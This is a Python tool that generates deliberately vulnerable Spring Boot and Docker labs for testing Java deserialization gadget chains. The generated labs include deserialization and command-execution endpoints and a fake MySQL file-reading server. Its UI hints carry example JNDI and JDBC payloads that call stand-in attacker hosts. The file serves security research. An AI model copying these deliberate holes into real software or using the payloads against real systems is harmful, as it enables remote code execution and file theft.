#!/usr/bin/env python3
"""
Vulnerable Environment Generator - MCP Tool 2 (v3.1)
Generates minimal Spring Boot environments for each java-chains gadget chain recipe.

Changes in v3.1 over v3.0:
  8. Added CTRL_INFO controller for OtherPayload chains (JSP文件, Spring Bean Xml,
     SpringBoot charsets.jar生成) — serves an info page only, no deserialize endpoint.
  9. Added CTRL_FAKE_MYSQL controller for FakeMySQLReadPayload (ReadFile) — starts a
     minimal fake MySQL server that reads arbitrary files via LOAD DATA LOCAL INFILE.
 10. _pick_controller() now correctly routes OtherPayload → CTRL_INFO and
     FakeMySQLReadPayload → CTRL_FAKE_MYSQL before falling through to CTRL_NATIVE.
 11. FakeMySQLSHPayload added to _JNDI_BASIC_PTS (命令执行/DNSLog/Sleep chains).
 12. _CHAIN_SAFE_NAME and ChainService.SAFE_TO_CHAIN extended with JDK17 RCE链 / 链2.
 13. _write_dockerfile() EXPOSEs port 3306 for CTRL_FAKE_MYSQL containers.
 14. generate_docker_compose() maps port 3306 for the readfile service.
"""

import os
import sys
import json
import re
import shutil
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass


# ---------------------------------------------------------------------------
# Controller type constants
# ---------------------------------------------------------------------------
CTRL_NATIVE     = "NATIVE"       # Java ObjectInputStream
CTRL_HESSIAN    = "HESSIAN"      # Hessian2Input
CTRL_AMF        = "AMF"          # BlazeDS AmfMessageDeserializer (AMF3 protocol)
CTRL_JNDI_REF   = "JNDI_REF"    # JNDI ResourceRef (server-side JNDI lookup trigger)
CTRL_JNDI_BASIC = "JNDI_BASIC"  # Plain InitialContext.lookup()
CTRL_JDBC       = "JDBC"         # JDBC URL注入 (DriverManager.getConnection)
CTRL_INFO       = "INFO"         # 说明页：payload生成工具链，无可触发反序列化端点
CTRL_FAKE_MYSQL = "FAKE_MYSQL"   # FakeMySQL读文件 (LOAD DATA LOCAL INFILE)

# payload_type sets that determine controller type
_HESSIAN_PTS    = {"HessianPayload", "Hessian2Payload",
                   "Hessian2ToStringPayload"}
# AMF3 (Adobe BlazeDS): AmfMessageSerializer/AmfMessageDeserializer protocol.
# AmfMessageDeserializer.readMessage() parses the AMF3 envelope and internally
# triggers ObjectInputStream.readObject() via Externalizable objects.
_AMF_PTS        = {"BlazeDSAMF3AMPayload"}
_JNDI_REF_PTS   = {"JNDIResourceRefPayload",
                   "JNDIReferencePayload", "JNDIRefBypassPayload"}
# FakeMySQLSHPayload added: 命令执行/DNSLog探测链/Sleep探测链 carry this type
_JNDI_BASIC_PTS = {"JNDIBasicPayload", "BytecodePayload",
                   "JNDIShowHandPayload", "FakeMySQLSHPayload"}
_JDBC_PTS       = {"JDBCUrlPayload"}   # JDBC URL payload type
_OTHER_PTS      = {"OtherPayload"}     # payload-generation utility chains
_FAKE_MYSQL_READ_PTS = {"FakeMySQLReadPayload"}  # ReadFile链


def _pick_controller(chain_name: str, payload_types: List[str]) -> str:
    """
    Choose the correct deserialization protocol for this chain using payload_types.
    payload_types comes from the new chain_info format (list of strings from YAML key).

    Priority (highest first):
      JDBC      — explicit JDBCUrlPayload OR chain name contains 'jdbc'
      HESSIAN   — Hessian/Hessian2/Hessian2ToString
      AMF       — BlazeDSAMF3AMPayload
      JNDI_REF  — JNDIResourceRef / JNDIReference / JNDIRefBypass
      JNDI_BASIC — JNDIBasic / Bytecode / JNDIShowHand / FakeMySQLSH
      FAKE_MYSQL — FakeMySQLReadPayload  (ReadFile链)
      INFO      — OtherPayload  (JSP文件, Spring Bean Xml, charsets.jar)
      NATIVE    — everything else (JavaNativePayload, ShiroPayload, …)
    """
    pts = set(payload_types)
    # JDBC: explicit payload type, OR the chain is an OtherPayload utility
    # whose name contains 'jdbc' (e.g. "H2 Jdbc Url").
    # We do NOT apply the name heuristic to chains that already have concrete
    # payload types (JavaNativePayload, JNDIReferencePayload, etc.) — those
    # chains happen to mention "Jdbc" in their names but the JNDI/NATIVE
    # branches below are the correct destination.
    #   Examples of correct routing:
    #     "H2 Jdbc Url"               OtherPayload            → JDBC   ✓
    #     "Fastjson C3p0 Jdbc h2链"   JavaNativePayload       → NATIVE ✓
    #     "HikariJdbcAttack Jdbc 利用" JNDIReferencePayload   → JNDI_REF ✓
    name_suggests_jdbc = (
        "jdbc" in chain_name.lower()
        and bool(pts & _OTHER_PTS)   # only OtherPayload chains use the name heuristic
        and not (pts & _JNDI_REF_PTS)
    )
    if pts & _JDBC_PTS or name_suggests_jdbc:
        return CTRL_JDBC
    if pts & _HESSIAN_PTS:
        return CTRL_HESSIAN
    if pts & _AMF_PTS:
        return CTRL_AMF
    if pts & _JNDI_REF_PTS:
        return CTRL_JNDI_REF
    if pts & _JNDI_BASIC_PTS:
        return CTRL_JNDI_BASIC
    # New in v3.1 ↓
    if pts & _FAKE_MYSQL_READ_PTS:
        return CTRL_FAKE_MYSQL
    if pts & _OTHER_PTS:
        # H2 Jdbc Url is already caught above by the 'jdbc' name check.
        # Reaching here means a genuine payload-generation utility chain.
        return CTRL_INFO
    return CTRL_NATIVE


def explain_controller_rules(chain_name: str,
                             payload_types: List[str]) -> Dict[str, Any]:
    """
    Evaluate all controller routing rules and return detailed results
    for LLM reasoning.  Does NOT make a decision — only provides data.
    """
    pts = set(payload_types)

    rules = [
        {"name": "JDBC",       "set": _JDBC_PTS,           "priority": 1},
        {"name": "HESSIAN",    "set": _HESSIAN_PTS,        "priority": 2},
        {"name": "AMF",        "set": _AMF_PTS,            "priority": 3},
        {"name": "JNDI_REF",   "set": _JNDI_REF_PTS,       "priority": 4},
        {"name": "JNDI_BASIC", "set": _JNDI_BASIC_PTS,     "priority": 5},
        {"name": "FAKE_MYSQL", "set": _FAKE_MYSQL_READ_PTS, "priority": 6},
        {"name": "INFO",       "set": _OTHER_PTS,          "priority": 7},
    ]

    # Name-based JDBC heuristic
    name_suggests_jdbc = (
        "jdbc" in chain_name.lower()
        and bool(pts & _OTHER_PTS)
        and not (pts & _JNDI_REF_PTS)
    )

    evaluated = []
    matched_count = 0
    for rule in rules:
        matched = bool(pts & rule["set"])
        if matched:
            matched_count += 1
        evaluated.append({
            "rule_name": rule["name"],
            "priority": rule["priority"],
            "matched": matched,
            "payload_types_in_rule": sorted(rule["set"]),
            "payload_types_matched": sorted(pts & rule["set"]) if matched else [],
        })

    has_conflict = matched_count > 1
    rule_result = _pick_controller(chain_name, payload_types)

    return {
        "chain_name": chain_name,
        "payload_types": payload_types,
        "rule_result": rule_result,
        "name_suggests_jdbc": name_suggests_jdbc,
        "has_conflict": has_conflict,
        "rules_evaluated": evaluated,
    }


# ---------------------------------------------------------------------------
# Chain name → safe ASCII identifier
# ---------------------------------------------------------------------------

# Explicit table for every chain that appears in the default YAML.
# Values must be valid Java identifiers and Docker service names.
_CHAIN_SAFE_NAME: Dict[str, str] = {
    "CB1链":                        "cb1",
    "CB1 JNDI链1":                  "cb1jndi1",
    "CB1 JNDI链2":                  "cb1jndi2",
    "CB2链":                        "cb2",
    "K1链":                         "k1",
    "K1链二次反序列化1":             "k1deser1",
    "K1链二次反序列化2":             "k1deser2",
    "K2链":                         "k2",
    "K3链":                         "k3",
    "K4链":                         "k4",
    "Fastjson链":                   "fastjson",
    "Fastjson JNDI链":              "fastjsonjndi",
    "Fastjson C3p0 Jdbc h2链":      "fastjsonc3p0h2",
    "Fastjson2链":                  "fastjson2",
    "Jackson链":                    "jackson",
    "Jackson C3p0 Jdbc h2链":       "jacksonc3p0h2",
    "反序列化炸弹":                  "deserbomb",
    "DNSLog探测类":                  "dnslogclass",
    "C3P0反序列化1":                 "c3p01",
    "C3P0反序列化2":                 "c3p02",
    "命令执行":                      "cmdexec",
    "DNSLog探测链":                  "dnslogchain",
    "Sleep探测链":                   "sleepchain",
    "二次反序列化链":                "hessiandeser",
    "JDK原生链1":                   "jdknative1",
    "JDK原生链2（慎用）":            "jdknative2",
    "JDK原生BCEL链":                "jdkbcel",
    "JDK原生JNDI链":                "jdkjndi",
    "Spring JNDI链1":               "springjndi1",
    "Spring JNDI链2":               "springjndi2",
    "Spring 命令执行":               "springexec",
    "Xslt 代码执行":                "xslt",
    "Rome1低版本二次反序列化链":     "rome1",
    "Rome2高版本二次反序列化链":     "rome2",
    "JSP文件":                      "jspfile",
    "H2 Jdbc Url":                  "h2jdbcurl",
    "Spring Bean Xml 加载字节码":   "springbeanxml",
    "SpringBoot charsets.jar生成": "springbootcharsets",
    "经典 Tomcat EL 执行":          "tomcatel",
    "Groovy 脚本执行":              "groovy",
    "SnakeYaml 利用":               "snakeyaml",
    "BeanshellRef 利用":            "beanshellref",
    "HikariJdbcAttack Jdbc 利用":   "hikarijdbc",
    "Druid Jdbc 利用":              "druidjdbc",
    "Axis2链":                      "axis2",
    "Hessian XBean 链":             "hessianxbean",
    "Hessian Fastjson 链":          "hessianfastjson",
    "Hessian Jackson 链":           "hessianjackson",
    "ReadFile":                     "readfile",
    # v3.1: JDK17 high-version chains
    "JDK17 RCE链":                  "jdk17rce",
    "JDK17 RCE链2":                 "jdk17rce2",
}


def _safe_name(chain_name: str) -> str:
    """
    Return a safe ASCII identifier for a chain name.
    Used for: Java package suffix, Maven artifactId, Docker service name, directory name.
    Guaranteed to be non-empty and start with a letter.
    """
    if chain_name in _CHAIN_SAFE_NAME:
        return _CHAIN_SAFE_NAME[chain_name]
    # Fallback: strip non-ASCII, keep alphanumeric, lowercase
    ascii_only = re.sub(r'[^a-zA-Z0-9]', '', chain_name).lower()
    if len(ascii_only) >= 2:
        return ascii_only
    # Last resort: hash-based stable name
    return "chain" + str(abs(hash(chain_name)) % 100000)


# ---------------------------------------------------------------------------
# DTO
# ---------------------------------------------------------------------------

@dataclass
class GeneratedEnv:
    chain_name: str
    project_path: str
    pom_path: str
    dockerfile_path: str
    controller_type: str
    has_deserialize_endpoint: bool = True
    has_web_ui: bool = True


# ---------------------------------------------------------------------------
# Generator
# ---------------------------------------------------------------------------

class VulnerableEnvGenerator:

    BASE_IMAGE = "eclipse-temurin:8u432-b06-jdk-jammy"

    # JNDI chains need a JDK before the 8u191 trustURLCodebase restriction.
    # The restriction is compiled into the JVM binary; System.setProperty alone
    # cannot override it on 8u191+. openjdk:8u171 pre-dates ALL JNDI fixes.
    JNDI_BASE_IMAGE = "openjdk:8u171-jdk"

    def __init__(self, pom_dir: str = "gadget-dependencies",
                 output_dir: str = "generated-env"):
        self.pom_dir  = Path(pom_dir)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.chains_info: Dict[str, Dict] = self._load_chains_summary()

    # ------------------------------------------------------------------
    # Load chain metadata produced by gadget_chain_analyzer v3
    # ------------------------------------------------------------------

    def _load_chains_summary(self) -> Dict[str, Dict]:
        summary_path = self.pom_dir / "gadget_chains_summary.json"
        chains: Dict[str, Dict] = {}
        if summary_path.exists():
            try:
                with open(summary_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for c in data.get("chains", []):
                    chains[c["name"]] = c
                print(f"Loaded {len(chains)} chain records from summary")
            except Exception as e:
                print(f"Warning: could not load summary: {e}")
        return chains

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate_all_environments(self) -> Dict[str, Any]:
        if not self.pom_dir.exists():
            return {"success": False,
                    "error": f"pom_dir not found: {self.pom_dir}"}

        chain_dirs = [d for d in self.pom_dir.iterdir()
                      if d.is_dir() and (d / "pom.xml").exists()]
        print(f"Found {len(chain_dirs)} chain directories")

        # Build a normalised lookup: dir_name → original chain name
        # The analyzer writes dirs as re.sub(r'[^\w\-]', '_', chain.name).
        # chains_info is keyed by the original name (with spaces/Chinese chars).
        _norm_to_original: Dict[str, str] = {}
        for original_name in self.chains_info:
            norm = re.sub(r"[^\w\-]", "_", original_name)
            _norm_to_original[norm] = original_name

        results: Dict[str, Any] = {}
        for d in chain_dirs:
            dir_name = d.name
            # Prefer the original name so chain_info lookup works
            chain_name = _norm_to_original.get(dir_name, dir_name)
            print(f"\n  Generating: {dir_name}")
            try:
                r = self.generate_single_environment(chain_name)
                results[dir_name] = r
                tag = "[OK]" if r.get("success") else "[ERR]"
                print(f"  {tag} {r.get('project_path', r.get('error'))}")
            except Exception as exc:
                results[dir_name] = {"success": False, "error": str(exc)}

        ok = sum(1 for r in results.values() if r.get("success"))
        return {
            "success":          True,
            "total_generated":  ok,
            "environments":     results,
            "output_directory": str(self.output_dir.resolve()),
        }

    def generate_single_environment(self, chain_name: str,
                                    chain_info: Optional[Dict] = None) -> Dict[str, Any]:
        if chain_info is None:
            chain_info = self.chains_info.get(chain_name, {})

        # Find pom.xml produced by gadget_chain_analyzer
        source_pom = self._find_source_pom(chain_name)
        if source_pom is None:
            return {"success": False,
                    "error": f"pom.xml not found for '{chain_name}' in {self.pom_dir}"}

        safe = _safe_name(chain_name)
        project_dir    = self.output_dir / safe
        java_pkg_dir   = project_dir / "src" / "main" / "java" / "com" / "deser" / safe
        resources_dir  = project_dir / "src" / "main" / "resources"
        java_pkg_dir.mkdir(parents=True, exist_ok=True)
        resources_dir.mkdir(parents=True, exist_ok=True)

        # Determine controller type from payload_types
        payload_types = chain_info.get("payload_types", [])
        ctrl_type = _pick_controller(chain_name, payload_types)

        # Write pom.xml (patched copy of the analyzer's output + extra deps if needed)
        maven_artifacts = chain_info.get("maven_artifacts", [])
        target_pom = project_dir / "pom.xml"
        self._write_pom(target_pom, source_pom, chain_name, safe, ctrl_type, maven_artifacts)

        # Write Spring Boot source files
        self._write_main_class(java_pkg_dir, chain_name, safe)
        self._write_controller(java_pkg_dir, chain_name, safe, ctrl_type)
        self._write_application_properties(resources_dir, chain_name, safe, maven_artifacts)
        self._write_web_ui(resources_dir, chain_name, ctrl_type)

        # Write Dockerfile
        dockerfile = self._write_dockerfile(project_dir, safe, ctrl_type)

        has_deserialize = ctrl_type != CTRL_INFO

        return {
            "success":                  True,
            "chain_name":               chain_name,
            "controller_type":          ctrl_type,
            "project_path":             str(project_dir.resolve()),
            "pom_path":                 str(target_pom.resolve()),
            "dockerfile_path":          str(dockerfile),
            "docker_compose_service":   self._docker_compose_service(chain_name, safe, ctrl_type),
            "has_deserialize_endpoint": has_deserialize,
            "has_web_ui":               True,
        }

    # ------------------------------------------------------------------
    # pom.xml
    # ------------------------------------------------------------------

    def _find_source_pom(self, chain_name: str) -> Optional[Path]:
        """
        Locate the pom.xml that gadget_chain_analyzer wrote for chain_name.
        The analyzer uses re.sub(r'[^\w\-]', '_', chain_name) as the directory name.
        """
        analyzer_dir_name = re.sub(r"[^\w\-]", "_", chain_name)
        candidates = [
            self.pom_dir / analyzer_dir_name / "pom.xml",
            self.pom_dir / chain_name / "pom.xml",
            self.pom_dir / _safe_name(chain_name) / "pom.xml",
        ]
        for p in candidates:
            if p.exists():
                return p

        # Fuzzy scan
        norm_chain = re.sub(r"\W", "", chain_name).lower()
        for d in self.pom_dir.iterdir():
            if not d.is_dir():
                continue
            norm_dir = re.sub(r"\W", "", d.name).lower()
            if norm_dir == norm_chain:
                p = d / "pom.xml"
                if p.exists():
                    return p

        return None

    def _write_pom(self, target: Path, source_pom: Path,
                   chain_name: str, safe: str, ctrl_type: str,
                   maven_artifacts: list = None):
        content = source_pom.read_text(encoding="utf-8")

        # Fix artifactId
        art_id = f"{safe}-env"
        content = re.sub(
            r"(</parent>\s*\n(?:\s*<groupId>[^<]*</groupId>\s*\n)?\s*)<artifactId>[^<]*</artifactId>",
            rf"\g<1><artifactId>{art_id}</artifactId>",
            content,
            count=1,
        )

        # Fix description
        content = re.sub(
            r"<description>[^<]*</description>",
            f"<description>{chain_name} — {ctrl_type} deserialization environment</description>",
            content,
            count=1,
        )

        # Ensure spring-boot-starter-web
        if "spring-boot-starter-web" not in content:
            content = content.replace(
                "<dependencies>",
                "<dependencies>\n" + _DEP_SPRING_WEB,
                1,
            )

        # Hessian
        if ctrl_type == CTRL_HESSIAN and "caucho" not in content:
            content = content.replace(
                "</dependencies>",
                _DEP_HESSIAN + "\n    </dependencies>",
                1,
            )

        # AMF
        if ctrl_type == CTRL_AMF and "flex-messaging-core" not in content:
            content = content.replace(
                "</dependencies>",
                _DEP_AMF + "\n    </dependencies>",
                1,
            )

        # Inject any missing maven_artifacts from chain_info
        # Skip spring-core / spring-beans: Spring Boot manages these and
        # overriding them causes NoSuchMethodError at runtime (e.g. spring-web
        # 5.2.15 calls StringUtils.matchesCharacter which only exists in
        # spring-core >= 5.2.14).
        _SKIP_ARTIFACT_IDS = {"spring-core", "spring-beans"}
        injected_aids = set()
        for art in (maven_artifacts or []):
            gid = art.get("groupId", "")
            aid = art.get("artifactId", "")
            ver = art.get("version", "")
            if not (gid and aid and ver):
                continue
            if aid in _SKIP_ARTIFACT_IDS:
                continue
            if aid not in content:
                dep_xml = (
                    f"\n        <!-- {chain_name}: {aid} (injected by vuln_env_generator) -->"
                    f"\n        <dependency>"
                    f"\n            <groupId>{gid}</groupId>"
                    f"\n            <artifactId>{aid}</artifactId>"
                    f"\n            <version>{ver}</version>"
                    f"\n        </dependency>"
                )
                content = content.replace(
                    "</dependencies>",
                    dep_xml + "\n    </dependencies>",
                    1,
                )
            injected_aids.add(aid)

        # spring-aop declares aspectjweaver as optional, but Hessian gadgets
        # that use Spring AOP advisor classes (BeanFactoryAspectInstanceFactory,
        # AbstractBeanFactoryPointcutAdvisor) need it at runtime.
        if "spring-aop" in injected_aids and "aspectjweaver" not in content:
            dep_xml = (
                "\n        <!-- aspectjweaver: required by spring-aop aspectj classes -->"
                "\n        <dependency>"
                "\n            <groupId>org.aspectj</groupId>"
                "\n            <artifactId>aspectjweaver</artifactId>"
                "\n            <version>1.9.5</version>"
                "\n        </dependency>"
            )
            content = content.replace(
                "</dependencies>",
                dep_xml + "\n    </dependencies>",
                1,
            )

        target.write_text(content, encoding="utf-8")

    # ------------------------------------------------------------------
    # Spring Boot application class
    # ------------------------------------------------------------------

    def _write_main_class(self, java_dir: Path, chain_name: str, safe: str):
        class_name = safe.capitalize() + "Application"
        src = f"""\
package com.deser.{safe};

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

/** Deserialization lab for: {chain_name} */
@SpringBootApplication
public class {class_name} {{
    public static void main(String[] args) {{
        SpringApplication.run({class_name}.class, args);
        System.out.println("=== {chain_name} env running on :8080 ===");
    }}
}}
"""
        (java_dir / f"{class_name}.java").write_text(src, encoding="utf-8")

    # ------------------------------------------------------------------
    # Controller dispatch
    # ------------------------------------------------------------------

    def _write_controller(self, java_dir: Path, chain_name: str,
                          safe: str, ctrl_type: str):
        pkg = f"com.deser.{safe}"
        if ctrl_type == CTRL_HESSIAN:
            src = _ctrl_hessian(pkg, chain_name)
        elif ctrl_type == CTRL_AMF:
            src = _ctrl_amf(pkg, chain_name)
        elif ctrl_type == CTRL_JNDI_REF:
            src = _ctrl_jndi_ref(pkg, chain_name)
        elif ctrl_type == CTRL_JNDI_BASIC:
            src = _ctrl_jndi_basic(pkg, chain_name)
        elif ctrl_type == CTRL_JDBC:
            src = _ctrl_jdbc(pkg, chain_name)
        elif ctrl_type == CTRL_INFO:
            src = _ctrl_info(pkg, chain_name)
        elif ctrl_type == CTRL_FAKE_MYSQL:
            src = _ctrl_fake_mysql(pkg, chain_name)
        else:
            src = _ctrl_native(pkg, chain_name)
        (java_dir / "DeserializationController.java").write_text(src, encoding="utf-8")

    # ------------------------------------------------------------------
    # application.properties
    # ------------------------------------------------------------------

    def _write_application_properties(self, resources_dir: Path,
                                      chain_name: str, safe: str,
                                      maven_artifacts: list = None):
        maven_artifacts = maven_artifacts or []
        artifact_ids = {art.get("artifactId", "") for art in maven_artifacts}

        excludes = []
        if artifact_ids & {"h2", "c3p0", "HikariCP", "druid"}:
            excludes += [
                "org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration",
                "org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration",
                "org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration",
            ]
        if "h2" in artifact_ids:
            excludes.append(
                "org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration"
            )

        base = f"""\
server.port=8080
spring.application.name={safe}-env
spring.servlet.multipart.max-file-size=10MB
spring.servlet.multipart.max-request-size=10MB
logging.level.com.deser=DEBUG
"""
        if excludes:
            excl_val = ",\\\n  ".join(excludes)
            base += f"\n# Prevent Spring Boot from auto-configuring a DataSource at startup\n"
            base += f"spring.autoconfigure.exclude=\\\n  {excl_val}\n"

        (resources_dir / "application.properties").write_text(base, encoding="utf-8")

    # ------------------------------------------------------------------
    # Web UI
    # ------------------------------------------------------------------

    def _write_web_ui(self, resources_dir: Path, chain_name: str, ctrl_type: str):
        static_dir = resources_dir / "static"
        static_dir.mkdir(exist_ok=True)

        if ctrl_type == CTRL_HESSIAN:
            payload_hint = "Hessian2 binary stream, Base64-encoded"
            input_label  = "Hessian2 payload (Base64)"
            show_exec    = "true"
        elif ctrl_type in (CTRL_JNDI_REF, CTRL_JNDI_BASIC):
            payload_hint = "JNDI URL — e.g. ldap://attacker.com/Exploit (plain or Base64)"
            input_label  = "JNDI URL"
            show_exec    = "false"
        elif ctrl_type == CTRL_JDBC:
            payload_hint = "JDBC URL — e.g. jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker/evil.sql'"
            input_label  = "JDBC URL"
            show_exec    = "true"
        elif ctrl_type == CTRL_INFO:
            payload_hint = "此链为 payload 生成工具，请通过 java-chains 生成文件后手动部署到目标，本容器无可触发端点"
            input_label  = "（不适用）"
            show_exec    = "false"
        elif ctrl_type == CTRL_FAKE_MYSQL:
            payload_hint = "目标文件路径 — e.g. /etc/passwd（victim MySQL 客户端连接本容器 3306 端口后触发 LOAD DATA LOCAL INFILE）"
            input_label  = "目标文件路径"
            show_exec    = "false"
        else:
            payload_hint = "Java-serialised bytes (aced 0005 ...), Base64-encoded"
            input_label  = "Serialized payload (Base64)"
            show_exec    = "true"

        # INFO 型没有 /api/deserialize，隐藏整个发送面板
        hide_deser_panel = "none" if ctrl_type == CTRL_INFO else "block"

        # FAKE_MYSQL 型需要展示轮询结果的额外说明
        fake_mysql_extra = ""
        if ctrl_type == CTRL_FAKE_MYSQL:
            fake_mysql_extra = """
<div class="card">
  <h2>使用说明</h2>
  <ol style="color:#8b949e;line-height:1.8">
    <li>POST /api/deserialize，body: <code>{"payload":"/etc/passwd"}</code></li>
    <li>容器在 3306 端口启动 FakeMySQL 监听（30s 超时）</li>
    <li>让 victim MySQL 客户端连接本容器 3306</li>
    <li>GET /api/result/{id} 轮询读取到的文件内容</li>
  </ol>
</div>"""

        html = f"""\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{chain_name} — Deser Lab</title>
<style>
  body{{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:0;padding:24px}}
  h1{{color:#58a6ff;font-size:1.4em;border-bottom:1px solid #30363d;padding-bottom:.5em}}
  .badge{{display:inline-block;background:#1f6feb;color:#fff;border-radius:4px;
          padding:2px 8px;font-size:.8em;margin-left:8px;vertical-align:middle}}
  .card{{background:#161b22;border:1px solid #30363d;border-radius:6px;
         padding:16px;margin:16px 0;font-size:.9em}}
  .card h2{{color:#58a6ff;font-size:1em;margin:0 0 8px}}
  label{{display:block;margin:.8em 0 .3em;color:#8b949e}}
  textarea,input[type=text]{{width:100%;background:#0d1117;border:1px solid #30363d;
    color:#c9d1d9;border-radius:6px;padding:8px;font-family:monospace;
    font-size:.85em;box-sizing:border-box}}
  textarea{{min-height:110px;resize:vertical}}
  button{{background:#238636;color:#fff;border:none;border-radius:6px;
          padding:7px 18px;cursor:pointer;font-size:.85em;margin-right:8px;margin-top:6px}}
  button.sec{{background:#21262d;border:1px solid #30363d}}
  .out{{margin-top:12px;border:1px solid #30363d;border-radius:6px;
        padding:10px;white-space:pre-wrap;font-size:.8em;display:none}}
  .out.ok{{border-color:#238636}} .out.err{{border-color:#f85149}}
  .info-notice{{background:#1a2332;border:1px solid #1f6feb;border-radius:6px;
               padding:14px;margin:16px 0;color:#79c0ff}}
</style>
</head>
<body>
<h1>{chain_name} <span class="badge">{ctrl_type}</span></h1>

<div class="card">
  <h2>Chain info</h2>
  Protocol: <b>{ctrl_type}</b><br>
  Hint: {payload_hint}
</div>
{fake_mysql_extra}
<div class="card" style="display:{hide_deser_panel}">
  <h2>Deserialization test</h2>
  <label>{input_label}</label>
  <textarea id="p" placeholder="Paste payload here..."></textarea>
  <button onclick="go()">Send payload</button>
  <button class="sec" onclick="document.getElementById('p').value='';
    document.getElementById('r1').style.display='none'">Clear</button>
  <pre id="r1" class="out"></pre>
</div>

<div class="card" id="exec-card" style="display:none">
  <h2>RCE verification — GET /api/exec</h2>
  <label>Command (executed directly by the server, not via gadget)</label>
  <input type="text" id="cmd" value="id" style="width:60%;display:inline-block">
  <button onclick="doExec()">Run</button>
  <pre id="r2" class="out"></pre>
</div>

<script>
var showExec="{show_exec}";
if(showExec==="true")document.getElementById("exec-card").style.display="block";

async function go(){{
  var p=document.getElementById("p").value.trim();
  if(!p){{alert("No payload");return;}}
  var r=document.getElementById("r1");
  try{{
    var res=await fetch("/api/deserialize",{{method:"POST",
      headers:{{"Content-Type":"application/json"}},
      body:JSON.stringify({{payload:p}})}});
    var d=await res.json();
    r.textContent=JSON.stringify(d,null,2);
    r.className=d.status==="SUCCESS"?"out ok":"out err";
    r.style.display="block";
  }}catch(e){{r.textContent="Error: "+e;r.className="out err";r.style.display="block";}}
}}

async function doExec(){{
  var cmd=document.getElementById("cmd").value.trim();
  if(!cmd)return;
  var r=document.getElementById("r2");
  try{{
    var res=await fetch("/api/exec?cmd="+encodeURIComponent(cmd));
    var d=await res.json();
    r.textContent=JSON.stringify(d,null,2);
    r.className=d.status==="SUCCESS"?"out ok":"out err";
    r.style.display="block";
  }}catch(e){{r.textContent="Error: "+e;r.className="out err";r.style.display="block";}}
}}
</script>
</body></html>
"""
        (static_dir / "index.html").write_text(html, encoding="utf-8")

    # ------------------------------------------------------------------
    # Dockerfile
    # ------------------------------------------------------------------

    def _write_dockerfile(self, project_dir: Path, safe: str,
                          ctrl_type: str = "") -> str:
        jndi_types = {CTRL_JNDI_REF, CTRL_JNDI_BASIC}
        base = self.JNDI_BASE_IMAGE if ctrl_type in jndi_types else self.BASE_IMAGE
        # FAKE_MYSQL needs port 3306 exposed in addition to 8080
        extra_expose = "\nEXPOSE 3306" if ctrl_type == CTRL_FAKE_MYSQL else ""
        content = f"""\
FROM {base}
WORKDIR /app
COPY target/{safe}-env-1.0.0.jar app.jar
EXPOSE 8080{extra_expose}
ENTRYPOINT ["java","-jar","app.jar"]
"""
        p = project_dir / "Dockerfile"
        p.write_text(content, encoding="utf-8")
        return str(p)

    def _docker_compose_service(self, chain_name: str, safe: str,
                                 ctrl_type: str = "") -> str:
        # FAKE_MYSQL containers also need port 3306 forwarded
        extra_ports = f'\n      - "3306:3306"' if ctrl_type == CTRL_FAKE_MYSQL else ""
        return f"""\
  {safe}:
    build: ./generated-env/{safe}
    container_name: {safe}-env
    ports:
      - "0:8080"{extra_ports}
    environment:
      - CHAIN_NAME={chain_name}
    networks:
      - deserialization-net
"""

    # ------------------------------------------------------------------
    # Build helpers (optional, invoked separately)
    # ------------------------------------------------------------------

    def build_maven(self, project_dir: Path) -> Dict[str, Any]:
        try:
            r = subprocess.run(["mvn", "clean", "package", "-DskipTests"],
                               cwd=str(project_dir), capture_output=True,
                               text=True, timeout=600)
            if r.returncode == 0:
                return {"success": True}
            return {"success": False, "error": r.stderr[-2000:]}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def build_docker(self, project_dir: Path, tag: str) -> Dict[str, Any]:
        try:
            r = subprocess.run(["docker", "build", "-t", tag, "."],
                               cwd=str(project_dir), capture_output=True,
                               text=True, timeout=600)
            if r.returncode == 0:
                return {"success": True, "image": tag}
            return {"success": False, "error": r.stderr[-2000:]}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def generate_docker_compose(self, environments: Dict[str, Dict]) -> str:
        """
        Write docker-compose.yml to the BS5 root (parent of generated-env/).
        """
        _GATEWAY_SVC = """  gateway:
    build: ./gateway
    container_name: deserialization-gateway
    ports:
      - "8080:8080"
    environment:
      - GATEWAY_MODE=true
      - BS5_ROOT=/data
    volumes:
      - ./gadget-dependencies:/data/gadget-dependencies:ro
      - ./generated-env:/data/generated-env:ro
    networks:
      - deserialization-net
"""
        lines = ["version: '3.8'\nservices:"]
        lines.append(_GATEWAY_SVC)

        port = 8081
        for env in environments.values():
            if env.get("success") and "docker_compose_service" in env:
                svc = env["docker_compose_service"].replace(
                    '- "0:8080"', f'- "{port}:8080"', 1)
                lines.append(svc)
                port += 1

        lines += ["\nnetworks:\n  deserialization-net:\n    driver: bridge\n"]
        compose = "\n".join(lines)
        out = self.output_dir.parent / "docker-compose.yml"
        out.write_text(compose, encoding="utf-8")
        print(f"docker-compose.yml → {out}")
        return str(out)


# ---------------------------------------------------------------------------
# Snippet constants used in _write_pom
# ---------------------------------------------------------------------------

_DEP_SPRING_WEB = """\
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>"""

_DEP_HESSIAN = """\
        <!-- Required by Hessian controller -->
        <dependency>
            <groupId>com.caucho</groupId>
            <artifactId>hessian</artifactId>
            <version>4.0.66</version>
        </dependency>"""

_DEP_AMF = """\
        <!-- Required by AMF controller (BlazeDS AmfMessageDeserializer) -->
        <dependency>
            <groupId>org.apache.flex.blazeds</groupId>
            <artifactId>flex-messaging-core</artifactId>
            <version>4.7.2</version>
        </dependency>
        <dependency>
            <groupId>org.apache.flex.blazeds</groupId>
            <artifactId>flex-messaging-common</artifactId>
            <version>4.7.2</version>
